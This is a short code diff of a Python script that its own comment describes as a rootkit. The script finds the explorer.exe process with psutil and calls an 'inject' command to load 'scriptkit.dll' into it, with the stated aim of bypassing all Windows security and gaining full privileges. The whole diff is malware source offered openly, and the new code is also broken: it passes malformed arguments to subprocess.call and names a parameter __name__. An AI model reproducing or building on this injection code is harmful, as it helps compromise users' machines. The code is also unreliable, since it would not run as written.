@@ -6,7 +6,19 @@
 ###
 ###  Method: Injects malicous code into explorer.exe to run malicious code to make windows think its trusted to completly bypass all security measures and run the rootkit with full privileges.
 
-import scriptkitapi
+import os
+import subprocess
+import psutil
 
-scriptkitapi.dll_path = "scriptkit.dll"
-scriptkitapi.inject_dll(scriptkitapi.name_to_pid("explorer.exe")[0], scriptkitapi.dll_path)
+dll_path = "scriptkit.dll"
+
+def get_pid_by_name(__name__):
+    for proc in psutil.process_iter(['pid', 'name']):
+        try:
+            if proc.info['name'] == __name__:
+                return proc.info['pid']
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return None
+
+subprocess.call(["inject"], [get_pid_by_name("explorer.exe")], ["scriptkit\\scriptkit.dll"])
